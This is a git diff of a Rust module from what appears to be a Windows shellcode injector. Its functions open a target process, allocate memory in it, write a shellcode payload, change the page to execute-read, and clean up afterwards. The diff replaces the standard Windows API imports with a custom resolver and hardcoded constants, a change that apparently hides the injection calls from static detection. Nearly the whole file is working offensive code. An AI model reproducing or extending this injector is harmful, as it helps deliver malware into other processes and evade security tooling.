@@ -1,22 +1,24 @@
 #[cfg(windows)]
 use crate::log::LogSink;
-#[cfg(windows)]
-use windows::Win32::Foundation::{CloseHandle, FALSE, HANDLE};
-#[cfg(windows)]
-use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
-#[cfg(windows)]
-use windows::Win32::System::Memory::{
-    VirtualAllocEx, VirtualFreeEx, VirtualProtectEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
-    PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
-};
-#[cfg(windows)]
-use windows::Win32::System::Threading::{OpenProcess, PROCESS_VM_OPERATION};
 
 #[cfg(windows)]
-pub fn free_remote(process: HANDLE, base: *mut core::ffi::c_void, log: &LogSink) {
+const MEM_COMMIT: u32 = 0x1000;
+#[cfg(windows)]
+const MEM_RESERVE: u32 = 0x2000;
+#[cfg(windows)]
+const MEM_RELEASE: u32 = 0x8000;
+#[cfg(windows)]
+const PAGE_READWRITE: u32 = 0x04;
+#[cfg(windows)]
+const PAGE_EXECUTE_READ: u32 = 0x20;
+#[cfg(windows)]
+const PROCESS_VM_OPERATION: u32 = 0x0008;
+
+#[cfg(windows)]
+pub fn free_remote(process: *mut std::ffi::c_void, base: *mut std::ffi::c_void, log: &LogSink) {
     log.detail("[cleanup] VirtualFreeEx — MEM_RELEASE");
     unsafe {
-        let _ = VirtualFreeEx(process, base, 0, MEM_RELEASE);
+        let _ = crate::resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE);
     }
 }
 
@@ -26,29 +28,28 @@ pub fn cleanup(pid: u32, remote_base: u64, size: usize, log: &LogSink) {
         "[CLEANUP] Freeing {} bytes at 0x{:X} in PID {}",
         size, remote_base, pid
     ));
-    let process = match unsafe { OpenProcess(PROCESS_VM_OPERATION, FALSE, pid) } {
-        Ok(h) => h,
-        Err(e) => {
-            log.error(format!("OpenProcess failed: {e}"));
-            return;
-        }
-    };
-    let base = remote_base as *mut core::ffi::c_void;
-    let result = unsafe { VirtualFreeEx(process, base, 0, MEM_RELEASE) };
-    let _ = unsafe { CloseHandle(process) };
-    match result {
-        Ok(()) => log.step("[CLEANUP] Remote memory freed successfully."),
-        Err(e) => log.error(format!("[CLEANUP] VirtualFreeEx failed: {e}")),
+    let process = unsafe { crate::resolve::OpenProcess(PROCESS_VM_OPERATION, 0, pid) };
+    if process.is_null() {
+        log.error("OpenProcess failed".to_string());
+        return;
+    }
+    let base = remote_base as *mut std::ffi::c_void;
+    let result = unsafe { crate::resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE) };
+    unsafe { crate::resolve::CloseHandle(process) };
+    if result != 0 {
+        log.step("[CLEANUP] Remote memory freed successfully.");
+    } else {
+        log.error("[CLEANUP] VirtualFreeEx failed".to_string());
     }
 }
 
 #[cfg(windows)]
 pub fn write_remote_payload(
-    process: HANDLE,
+    process: *mut std::ffi::c_void,
     shellcode: &[u8],
     total_steps: u32,
     log: &LogSink,
-) -> Result<*mut core::ffi::c_void, String> {
+) -> Result<*mut std::ffi::c_void, String> {
     let size = shellcode.len();
 
     log.step(format!(
@@ -56,9 +57,9 @@ pub fn write_remote_payload(
         total_steps
     ));
     let base = unsafe {
-        VirtualAllocEx(
+        crate::resolve::VirtualAllocEx(
             process,
-            None,
+            std::ptr::null(),
             size,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
@@ -79,17 +80,18 @@ pub fn write_remote_payload(
         total_steps, size
     ));
     let mut written: usize = 0;
-    if let Err(e) = unsafe {
-        WriteProcessMemory(
+    let ok = unsafe {
+        crate::resolve::WriteProcessMemory(
             process,
-            base as *const core::ffi::c_void,
-            shellcode.as_ptr() as *const core::ffi::c_void,
+            base as *const std::ffi::c_void,
+            shellcode.as_ptr() as *const std::ffi::c_void,
             size,
-            Some(&mut written),
+            &mut written,
         )
-    } {
+    };
+    if ok == 0 {
         free_remote(process, base, log);
-        return Err(format!("WriteProcessMemory failed: {e}"));
+        return Err("WriteProcessMemory failed".to_string());
     }
     log.info(format!("      wrote {} bytes", written));
 
@@ -97,22 +99,23 @@ pub fn write_remote_payload(
         "[4/{}] VirtualProtectEx — PAGE_READWRITE -> PAGE_EXECUTE_READ",
         total_steps
     ));
-    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-    if let Err(e) = unsafe {
-        VirtualProtectEx(
+    let mut old_protect: u32 = 0;
+    let ok = unsafe {
+        crate::resolve::VirtualProtectEx(
             process,
-            base as *const core::ffi::c_void,
+            base as *const std::ffi::c_void,
             size,
             PAGE_EXECUTE_READ,
             &mut old_protect,
         )
-    } {
+    };
+    if ok == 0 {
         free_remote(process, base, log);
-        return Err(format!("VirtualProtectEx failed: {e}"));
+        return Err("VirtualProtectEx failed".to_string());
     }
     log.info(format!(
         "      remote page is now PAGE_EXECUTE_READ (previous protection: {:#x})",
-        old_protect.0
+        old_protect
     ));
 
     Ok(base)
